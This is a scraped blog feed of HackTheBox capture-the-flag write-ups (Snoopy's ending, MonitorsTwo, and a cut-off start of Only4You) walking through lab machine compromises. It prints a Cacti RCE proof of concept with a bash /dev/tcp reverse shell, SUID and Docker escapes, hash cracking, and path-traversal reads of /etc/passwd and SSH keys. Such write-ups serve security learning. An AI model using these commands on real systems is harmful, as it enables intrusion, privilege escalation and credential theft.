AAAAB3NzaC1yc2EAAAADAQABAAACAQCoYOhyzFyp/SK3eAv9dlpn7iXK16ZyDfwaFWvxP09jI3NfPmP/6aS8aTQxx09IOsfFwVhdu+cI2SXqn3QboOcQQXJOujgSeBkuFqtocxUla12XG3nYX0SSK0QQZdcQCIj+ufSRQ1Iw5DKUTeZLfjuC1CTiIqJ3fm38RbzP0sA2hsrZj7bDq8HF9sdE9AzE2w9pG5SOEICary8Y0SBJg2LB2kd6EsAiMPTHNCsk4H+dIKphkmsxxUvYPQ9PJbxCr8TLWmCrEWxVVQqeU5z2jRZUlPw0/K1F1zSBYHCYCXs6hMO/Gh/WMqKPQc16IN0L/kRQoz0yVWxQMUxOTor1X9Gh1e0TBfk08VUQ7l1QG4iCxmLwkIFeOubSZby5tnRAvfeh1fKge3hahBmMcnX06S+OhzSM9N8AESDhm4I5+n6IJVEkGnXFdfMeZuxoF14xNubPFQ/pVmw62BUui6WiS8fAPDeuaKNIRkfx2ziOOV7mSnHcKsgPoU0u/2JPOilYLl3knq15Xl13FzH/PBWRMI7ejfPmaOS96Q55SRUntuG5NWY1LWkeGnX2kag8zZ1gRdcfKMIKJ0yGnI5b0fqr4p+WsbBAXAnuqFSds65jwIFxTp3l35cjyBlyaqncQZId6ZSt0xdEM85dnsDapU2f3Ol6jEEEzYcNOZwINyM+QFLvbQ== kali@kali Lastly, I sent it back:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 sbrown@snoopy:/tmp$ sudo clamscan -d 1.ndb ./authorized_keys --move=/root/.ssh/ Loading: 0s, ETA: 0s [========================\u0026gt;] 1/1 sigs Compiling: 0s, ETA: 0s [========================\u0026gt;] 40/40 tasks /tmp/authorized_keys: Trojan.A.UNOFFICIAL FOUND traverse_rename: Failed to rename: /tmp/authorized_keys to: /root/.ssh/authorized_keys Error:Invalid cross-device link /tmp/authorized_keys: moved to \u0026#39;/root/.ssh/authorized_keys\u0026#39; ----------- SCAN SUMMARY ----------- Known viruses: 1 Engine version: 1.0.0 Scanned directories: 0 Scanned files: 1 Infected files: 1 Data scanned: 0.00 MB Data read: 0.00 MB (ratio 0.00:1) Time: 0.012 sec (0 m 0 s) Start Date: 2023:05:09 22:35:07 End Date: 2023:05:09 22:35:07 sbrown@snoopy:/tmp$ Now I can authenticate as root:\n1 2 3 4 5 6 7 ┌──(kali㉿kali)-[~/Documents/Snoopy] └─$ ssh root@10.10.11.212 Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-71-generic x86_64) \u0026lt;...SNIP...\u0026gt; root@snoopy:~# whoami root root@snoopy:~# Reflection I enjoyed the learning process for this box a considerable amount. Even from the beginning of enumerating DNS config files and setting up a mail server, this challenge gave me the opportunity to learn many new things! Although it was revealed to be mostly unintended, I appreciated how there were several possible paths to root. It was fun to discuss with others the ideas they had to manipulate the clamscan behaviors.\n","date":"2023-09-23T11:09:31-05:00","image":"https://yuwenmichael.netlify.app/post/hackthebox-snoopy/Snoopy_hud07959f3cf61b04fdf0f95ac5d23e1cb_383611_120x120_fill_box_smart1_3.png","permalink":"https://yuwenmichael.netlify.app/post/hackthebox-snoopy/","title":"HackTheBox - Snoopy"},{"content":"Enumeration Initial nmap:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 Starting Nmap 7.94 ( https://nmap.org ) at 2023-04-30 10:18 EDT Nmap scan report for 10.10.11.211 Host is up (0.032s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA) | 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA) |_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Login to Cacti Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 9.68 seconds Visiting the website, the default page has a login box, with a reference to The Cacti Group:\nUsing directory fuzzing, we see can see more info on the backend server by viewing the changelog:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 $ feroxbuster -u http://10.10.11.211/ ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.10.0 ───────────────────────────┬────────────────────── 🎯 Target Url │ http://10.10.11.211/ 🚀 Threads │ 50 📖 Wordlist │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt 👌 Status Codes │ All Status Codes! 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.10.0 💉 Config File │ /etc/feroxbuster/ferox-config.toml 🔎 Extract Links │ true 🏁 HTTP methods │ [GET] 🔃 Recursion Depth │ 4 ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Management Menu™ ────────────────────────────────────────────────── \u0026lt;...SNIP...\u0026gt; 200 GET 0l 0w 254887c http://10.10.11.211/CHANGELOG \u0026lt;...SNIP...\u0026gt; The changelog also tells us that this is for Cacti version 1.2.22, which was seen at the footer of the login page.\nA quick google search shows that cacti 1.2.22 has a remote command execution vulnerability. Utilizing this CVE, we can have remote code execution.\nFoothold Utilizing CVE 2022-46169 POC code obtained from this github repository Testing the POC with a curl command:\n1 $ python poc.py -c \u0026#39;curl 10.10.14.139\u0026#39; http://10.10.11.211 On my listener server, I see a hit:\n1 2 3 4 5 6 7 $ nc -nvlp 80 listening on [any] 80 ... connect to [10.10.14.139] from (UNKNOWN) [10.10.11.211] 39370 GET / HTTP/1.1 Host: 10.10.14.139 User-Agent: curl/7.74.0 Accept: */* Now we can go ahead and try a reverse shell payload:\n1 2 $ python poc.py -c \u0026#34;bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.139/8888 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34; http://10.10.11.211 [*] Trying for 1 - 100 host ids Meanwhile on my listener:\n1 2 3 4 5 6 $ nc -nvlp 8888 listening on [any] 8888 ... connect to [10.10.14.139] from (UNKNOWN) [10.10.11.211] 58858 bash: cannot set terminal process group (1): Inappropriate ioctl for device bash: no job control in this shell www-data@50bca5e748b0:/var/www/html$ Enumerating docker container Looking at SUID privileges, we see a very dangerous SUID set in capsh:\n1 2 3 4 5 6 7 8 9 10 www-data@50bca5e748b0:/$ find / -perm /4000 2\u0026gt; /dev/null /usr/bin/gpasswd /usr/bin/passwd /usr/bin/chsh /usr/bin/chfn /usr/bin/newgrp /sbin/capsh /bin/mount /bin/umount /bin/su gtfobins covers how we might abuse this setting to elevate our privileges to root level:\nBy abusing this 2nd command we become the root user. However, there is something strange about this filesystem.\n1 2 www-data@50bca5e748b0:/$ capsh --gid=0 --uid=0 -- root@50bca5e748b0:/# There are no home folders, and root has no flag as well:\n1 2 3 4 5 6 7 8 9 10 11 12 root@50bca5e748b0:/# ls -al /home/ total 8 drwxr-xr-x 2 root root 4096 Mar 22 13:21 . drwxr-xr-x 1 root root 4096 Mar 21 10:49 .. root@50bca5e748b0:/# ls -al /root/ total 16 drwx------ 1 root root 4096 Mar 21 10:50 . drwxr-xr-x 1 root root 4096 Mar 21 10:49 .. lrwxrwxrwx 1 root root 9 Jan 9 2023 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 root root 571 Apr 10 2021 .bashrc lrwxrwxrwx 1 root root 9 Mar 21 10:50 .mysql_history -\u0026gt; /dev/null -rw-r--r-- 1 root root 161 Jul 9 2019 .profile Enumerating the file system some more shows that this is a docker container:\n1 2 3 4 5 6 7 8 9 root@50bca5e748b0:/# ls -al total 84 drwxr-xr-x 1 root root 4096 Mar 21 10:49 . drwxr-xr-x 1 root root 4096 Mar 21 10:49 .. -rwxr-xr-x 1 root root 0 Mar 21 10:49 .dockerenv drwxr-xr-x 1 root root 4096 Mar 22 13:21 bin drwxr-xr-x 2 root root 4096 Mar 22 13:21 boot drwxr-xr-x 5 root root 340 Apr 30 22:55 dev -rw-r--r-- 1 root root 648 Jan 5 2023 entrypoint.sh in the base directory /, we see a .dockerenv file, as well as an unusual entrypoint.sh.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 root@50bca5e748b0:/# cat entrypoint.sh #!/bin/bash set -ex wait-for-it db:3306 -t 300 -- echo \u0026#34;database is connected\u0026#34; if [[ ! $(mysql --host=db --user=root --password=root cacti -e \u0026#34;show tables\u0026#34;) =~ \u0026#34;automation_devices\u0026#34; ]]; then mysql --host=db --user=root --password=root cacti \u0026lt; /var/www/html/cacti.sql mysql --host=db --user=root --password=root cacti -e \u0026#34;UPDATE user_auth SET must_change_password=\u0026#39;\u0026#39; WHERE username = \u0026#39;admin\u0026#39;\u0026#34; mysql --host=db --user=root --password=root cacti -e \u0026#34;SET GLOBAL time_zone = \u0026#39;UTC\u0026#39;\u0026#34; fi chown www-data:www-data -R /var/www/html # first arg is `-f` or `--some-option` if [ \u0026#34;${1#-}\u0026#34; != \u0026#34;$1\u0026#34; ]; then set -- apache2-foreground \u0026#34;$@\u0026#34; fi exec \u0026#34;$@\u0026#34; This script is attaching to the mysql database, and updating some settings. Let\u0026rsquo;s see if we can attach to the database in the same fashion.\nConnecting to mysql database 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 root@50bca5e748b0:/# mysql --host=db --user=root --password=root cacti Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Welcome to the MariaDB monitor. Commands end with ; or \\g. Your MySQL connection id is 46 Server version: 5.7.40 MySQL Community Server (GPL) Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others. Type \u0026#39;help;\u0026#39; or \u0026#39;\\h\u0026#39; for help. Type \u0026#39;\\c\u0026#39; to clear the current input statement. MySQL [cacti]\u0026gt; show tables; +-------------------------------------+ | Tables_in_cacti | +-------------------------------------+ | aggregate_graph_templates | | aggregate_graph_templates_graph | | aggregate_graph_templates_item | \u0026lt;...SNIP...\u0026gt; Within the database, there is an interesting table user_auth. For simplicity, I show only username and password:\n1 2 3 4 5 6 7 8 9 MySQL [cacti]\u0026gt; select username, password from user_auth; +----------+--------------------------------------------------------------+ | username | password | +----------+--------------------------------------------------------------+ | admin | $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC | | guest | 43e9a4ab75570f5b | | marcus | $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C | +----------+--------------------------------------------------------------+ 3 rows in set (0.001 sec) In addition to a probably default admin and guest credential, we see a different user marcus. Submitting the hash to a rainbow table does not generate a hit.\nUsing hashcat, we can crack this:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 $ hashcat -m 3200 \u0026#39;$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C\u0026#39; /usr/share/wordlists/rockyou.txt hashcat (v6.2.5) starting \u0026lt;...SNIP...\u0026gt; $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C:funkymonkey Session..........: hashcat Status...........: Cracked Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix)) Hash.Target......: $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70Jonsd...hFYK4C Time.Started.....: Sun Apr 30 22:37:08 2023 (47 secs) Time.Estimated...: Sun Apr 30 22:37:55 2023 (0 secs) Kernel.Feature...: Pure Kernel Guess.Base.......: File (/usr/share/wordlists/rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 183 H/s (7.49ms) @ Accel:16 Loops:8 Thr:11 Vec:1 Recovered........: 1/1 (100.00%) Digests Progress.........: 8624/14344384 (0.06%) Rejected.........: 0/8624 (0.00%) Restore.Point....: 8448/14344384 (0.06%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1016-1024 Candidate.Engine.: Device Generator Candidates.#1....: allahuakbar -\u0026gt; johnmark Hardware.Mon.#1..: Temp: 65c Fan: 34% Util:100% Core:1316MHz Mem:3004MHz Bus:16 Escaping the docker container We have a successful crack as marcus:funkymonkey. However, checking our shell\u0026rsquo;s /etc/passwd shows that no user marcus currently exists:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 root@50bca5e748b0:/# cat /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin root@50bca5e748b0:/# This is because in this docker container, the contents are isolated from the host system. However with ssh open, we can use this entrypoint if marcus is a legitimate user on the main system:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 $ ssh marcus@10.10.11.211 The authenticity of host \u0026#39;10.10.11.211 (10.10.11.211)\u0026#39; can\u0026#39;t be established. ED25519 key fingerprint is SHA256:RoZ8jwEnGGByxNt04+A/cdluslAwhmiWqG3ebyZko+A. This key is not known by any other names. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added \u0026#39;10.10.11.211\u0026#39; (ED25519) to the list of known hosts. marcus@10.10.11.211\u0026#39;s password: Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-147-generic x86_64) \u0026lt;...SNIP...\u0026gt; You have mail. Last login: Thu Mar 23 10:12:28 2023 from 10.10.14.40 marcus@monitorstwo:~$ Privilege Escalation Finding system vulnerabilities discussed in mail We successfully login, and note that we are told we have some mail. For HackTheBox systems, this is usually no coincidence, so let\u0026rsquo;s check the mail contents first.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 marcus@monitorstwo:~$ cat /var/mail/marcus From: administrator@monitorstwo.htb To: all@monitorstwo.htb Subject: Security Bulletin - Three Vulnerabilities to be Aware Of Dear all, We would like to bring to your attention three vulnerabilities that have been recently discovered and should be addressed as soon as possible. CVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability. CVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially resulting in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability. CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed. We encourage you to take the necessary steps to address these vulnerabilities promptly to avoid any potential security breaches. If you have any questions or concerns, please do not hesitate to contact our IT department. Best regards, Administrator CISO Monitor Two Security Team We are detailed 3 CVEs that the box is vulnerable to, at least once this mail letter has been sent. We can do quick checks to see if any of these have been remediated in our box: Checking kernel version (CVE-2021-33033)\n1 2 marcus@monitorstwo:~$ uname -a Linux monitorstwo 5.4.0-147-generic #164-Ubuntu SMP Tue Mar 21 14:23:17 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux Our version was compiled in March 2023, while the CVE is listed with the year 2021. This kernel version will likely not be vulnerable to CVE-2021-33033.\nCVE-2020-25706 is related to cacti version 1.2.13. Recall on the login page as well as the CHANGELOG, we saw our cacti version at the higher 1.2.22, meaning this is not a valid attack route.\nChecking docker version(CVE-2021-41091)\n1 2 3 4 5 6 7 8 9 10 11 marcus@monitorstwo:~$ docker version Client: Version: 20.10.5+dfsg1 API version: 1.41 Go version: go1.15.9 Git commit: 55c4c88 Built: Wed Aug 4 19:55:57 2021 OS/Arch: linux/amd64 Context: default Experimental: true Got permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get \u0026#34;http://%2Fvar%2Frun%2Fdocker.sock/v1.24/version\u0026#34;: dial unix /var/run/docker.sock: connect: permission denied The docker version is old, meaning CVE-2021-41091 is a potential target.\nAbusing CVE-2021-41091 We can get more information about CVE-2021-41091 here, by the person who discovered the bug. This exploit takes advantage that user id\u0026rsquo;s within docker containers and outside the docker containers are shared. So we can create a file with a user inside the docker container, and when accessing the file from outside the docker container, the user id will be retained. This characteristic is normal for linux, but what is not normal is a regular user being able to enter the docker container\u0026rsquo;s filesystem. This is ideal for our situation, where we control root from inside the container. The workflow will look something like this:\nAs root within docker, create a bash binary with SUID binary set. Any user can run this as root, and get a root bash session. As marcus outside the container, find the container location in the file system As marcus, access the bash binary. Because this SUID binary was made with user ID 0, it will still be treated as such, meaning the system\u0026rsquo;s root user. As marcus, execute the SUID binary and obtain a root shell escaped from the docker session Using findmnt to locate docker filesystems 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 marcus@monitorstwo:~$ findmnt TARGET SOURCE FSTYPE OPTIONS / /dev/sda2 ext4 rw,relatime ├─/sys sysfs sysfs rw,nosuid,nodev,noexec,relatime │ ├─/sys/kernel/security securityfs securityfs rw,nosuid,nodev,noexec,relatime \u0026lt;...SNIP...\u0026gt; ├─/run tmpfs tmpfs rw,nosuid,nodev,noexec,relatime,size=402608k,mode=755 │ ├─/run/lock tmpfs tmpfs rw,nosuid,nodev,noexec,relatime,size=5120k │ ├─/run/docker/netns/2a35f1c292bd nsfs[net:[4026532597]] │ │ nsfs rw │ ├─/run/user/1000 tmpfs tmpfs rw,nosuid,nodev,relatime,size=402608k,mode=700,uid=1000,gid=1 │ └─/run/docker/netns/22acd79d4ced nsfs[net:[4026532659]] │ nsfs rw ├─/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged │ overlay overlay rw,relatime,lowerdir=/var/lib/docker/overlay2/l/756FTPFO4AE7H ├─/var/lib/docker/containers/e2378324fced58e8166b82ec842ae45961417b4195aade5113fdc9c6397edc69/mounts/shm │ shm tmpfs rw,nosuid,nodev,noexec,relatime,size=65536k ├─/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged │ overlay overlay rw,relatime,lowerdir=/var/lib/docker/overlay2/l/4Z77R4WYM6X4B └─/var/lib/docker/containers/50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e/mounts/shm shm tmpfs rw,nosuid,nodev,noexec,relatime,size=65536k There are several docker files it looks like, and we want to know which is ours. To make it a little easier, I placed test in the base directory:\n1 2 3 4 root@50bca5e748b0:/# touch test root@50bca5e748b0:/# ls bin dev etc lib media opt root sbin sys tmp var boot entrypoint.sh home lib64 mnt proc run srv test usr Now we can view it when we access the correct container:\n1 2 3 marcus@monitorstwo:~$ ls /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged bin dev etc lib media opt root sbin sys tmp var boot entrypoint.sh home lib64 mnt proc run srv test usr Copying and setting SUID on container bash:\n1 2 root@50bca5e748b0:/# cp /bin/bash . root@50bca5e748b0:/# chmod +s ./bash Seeing the privileges set from marcus:\n1 2 3 4 5 6 marcus@monitorstwo:~$ ls /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged -al total 1304 drwxr-xr-x 1 root root 4096 Apr 30 03:21 . drwx-----x 5 root root 4096 Apr 30 22:55 .. -rwsr-sr-x 1 root root 1234376 Apr 30 03:22 bash \u0026lt;...SNIP...\u0026gt; Running the SUID bash from marcus\n1 2 3 4 5 marcus@monitorstwo:~$ /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bash -p bash-5.1# whoami root bash-5.1# pwd /home/marcus We can see the privilege escalation was successful, we are now root and still outside of the docker container!\nReflection While this box stayed true to the Easy ranking it achieved, I appreciated seeing a docker exploit such as this. Linux\u0026rsquo;s UID handling and ownership is something I find to be quite interesting, especially in cases like these, where the permissions of a root user on a restricted environment can still be abused outside the scope. The article on CVE-2021-41091 was a blast to read, and I\u0026rsquo;m glad I know more than before!\n","date":"2023-09-02T12:27:00-05:00","image":"https://yuwenmichael.netlify.app/post/hackthebox-monitorstwo/MonitorsTwo_hu024166abe3ac2c9d2978be07dc4c2b69_418807_120x120_fill_box_smart1_3.png","permalink":"https://yuwenmichael.netlify.app/post/hackthebox-monitorstwo/","title":"HackTheBox - MonitorsTwo"},{"content":"Enumeration Initial nmap:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 Starting Nmap 7.94 ( https://nmap.org ) at 2023-04-22 16:11 EDT Nmap scan report for 10.10.11.210 Host is up (0.038s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 e8:83:e0:a9:fd:43:df:38:19:8a:aa:35:43:84:11:ec (RSA) | 256 83:f2:35:22:9b:03:86:0c:16:cf:b3:fa:9f:5a:cd:08 (ECDSA) |_ 256 44:5f:7a:a3:77:69:0a:77:78:9b:04:e0:9f:11:db:80 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://only4you.htb/ |_http-server-header: nginx/1.18.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 9.41 seconds There are no extra interesting ports, only port 80 for an http webpage and 22 for ssh once credentials can be acquired.\nVisiting the webpage requires we add only4you.htb to our hosts file: /etc/hosts\n1 10.10.11.210 only4you.htb The server is powered by nginx:\n1 2 3 4 5 6 7 $ curl -I http://only4you.htb HTTP/1.1 200 OK Server: nginx/1.18.0 (Ubuntu) Date: Sat, 22 Apr 2023 20:48:01 GMT Content-Type: text/html; charset=utf-8 Content-Length: 34125 Connection: keep-alive Exploring subdomains 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 $ gobuster vhost -u http://only4you.htb/ -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://only4you.htb/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt [+] User Agent: gobuster/3.6 [+] Timeout: 10s [+] Append Domain: true =============================================================== Starting gobuster in VHOST enumeration mode =============================================================== Found: beta.only4you.htb Status: 200 [Size: 2191] We see an extra subdomain at beta.only4you.htb. Viewing the subdomain, we see a beta site, and a button to download source code in a zip file: Using burpsuite, we see that the download is performed via GET request to beta.only4you.htb/source.\nIf this had been related to a function (i.e: ?download=source), then it might be worth exploring directory traversal techniques.\nAnalyzing beta site source code Checking the source zip that is given, we see right away that the server is utilizing python:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 $ unzip source.zip Archive: source.zip creating: beta/ inflating: beta/app.py creating: beta/static/ creating: beta/static/img/ inflating: beta/static/img/image-resize.svg creating: beta/templates/ inflating: beta/templates/400.html inflating: beta/templates/500.html inflating: beta/templates/convert.html inflating: beta/templates/index.html inflating: beta/templates/405.html inflating: beta/templates/list.html inflating: beta/templates/resize.html inflating: beta/templates/404.html creating: beta/uploads/ creating: beta/uploads/resize/ creating: beta/uploads/list/ creating: beta/uploads/convert/ inflating: beta/tool.py There is an interesting uploads folder, as well as a tool.py file. The very first thing we can do is look at the routes defined in app.py, as this will tell us all the valid pages we can visit.\n1 2 3 4 5 6 7 $ cat app.py | grep route @app.route(\u0026#39;/\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) @app.route(\u0026#39;/resize\u0026#39;, methods=[\u0026#39;POST\u0026#39;, \u0026#39;GET\u0026#39;]) @app.route(\u0026#39;/convert\u0026#39;, methods=[\u0026#39;POST\u0026#39;, \u0026#39;GET\u0026#39;]) @app.route(\u0026#39;/source\u0026#39;) @app.route(\u0026#39;/list\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) @app.route(\u0026#39;/download\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) Note it is worth reading the full source code, but for simple reading I selected only the route lines.\nThere is a download page as previously discussed, and exploring the code for this route shows us that there have been efforts to mitigate directory traversal techniques:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 def download(): image = request.form[\u0026#39;image\u0026#39;] filename = posixpath.normpath(image) if \u0026#39;..\u0026#39; in filename or filename.startswith(\u0026#39;../\u0026#39;): flash(\u0026#39;Hacking detected!\u0026#39;, \u0026#39;danger\u0026#39;) return redirect(\u0026#39;/list\u0026#39;) if not os.path.isabs(filename): filename = os.path.join(app.config[\u0026#39;LIST_FOLDER\u0026#39;], filename) try: if not os.path.isfile(filename): flash(\u0026#39;Image doesn\\\u0026#39;t exist!\u0026#39;, \u0026#39;danger\u0026#39;) return redirect(\u0026#39;/list\u0026#39;) except (TypeError, ValueError): raise BadRequest() return send_file(filename, as_attachment=True) Moving up a folder with ../ has been prohibited, but python will often accept absolute paths as well. To check for this, we can simply try to download /etc/passwd:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 $ curl http://beta.only4you.htb/download -d \u0026#34;image=/etc/passwd\u0026#34; root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin \u0026lt;...SNIP...\u0026gt; john:x:1000:1000:john:/home/john:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false mysql:x:113:117:MySQL Server,,,:/nonexistent:/bin/false neo4j:x:997:997::/var/lib/neo4j:/bin/bash dev:x:1001:1001::/home/dev:/bin/bash Using Arbitrary File Read to retrieve main site source code By defining the absolute path of the file we wish to access, we can still bypass the rudimentary filters placed. Note for later, the system has two users: john and dev.\nLooking for ssh keys, unfortunately we cannot acquire:\n1 2 3 4 5 6 $ curl http://beta.only4you.htb/download -d \u0026#34;image=/home/john/.ssh/id_rsa\u0026#34; \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=en\u0026gt; \u0026lt;title\u0026gt;Redirecting...\u0026lt;/title\u0026gt; \u0026lt;h1\u0026gt;Redirecting...\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;You should be redirected automatically to the target URL: \u0026lt;a href=\u0026#34;/list\u0026#34;\u0026gt;/list\u0026lt;/a\u0026gt;. If not, click the link. In this case, redirection is the result of a file not existing.\nIt would be nice if we could view the source code associated with the main website, only4you.htb. To access, we need to find a way to know the folder names and location of files.\nUsing nginx configuration files:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 $ curl http://beta.only4you.htb/download -d \u0026#34;image=/etc/nginx/sites-enabled/default\u0026#34; server { listen 80; return 301 http://only4you.htb$request_uri; } server { listen 80; server_name only4you.htb; location / { include proxy_params; proxy_pass http://unix:/var/www/only4you.htb/only4you.sock; } } server { listen 80; server_name beta.only4you.htb; location / { include proxy_params; proxy_pass http://unix:/var/www/beta.only4you.htb/beta.sock; } } Here in the proxy_pass segments, we are given the full paths to our web roots: /var/www/only4you.htb/ and /var/www/beta.only4you.htb/. For python webservers, the main code is usually written as app.py or possibly main.py, however first I wanted to check any git info is available:\n1 2 3 4 5 6 $ curl http://beta.only4you.htb/download -d \u0026#34;image=/var/www/only4you.htb/.git/HEAD\u0026#34; \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=en\u0026gt; \u0026lt;title\u0026gt;Redirecting...\u0026lt;/title\u0026gt; \u0026lt;h1\u0026gt;Redirecting...\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;You should be redirected automatically to the target URL: \u0026lt;a href=\u0026#34;/list\u0026#34;\u0026gt;/list\u0026lt;/a\u0026gt;. If not, click the link. There was nothing here, so we can explore the source code of app.py on the main webpage:\n1 $ curl http://beta.only4you.htb/download -d 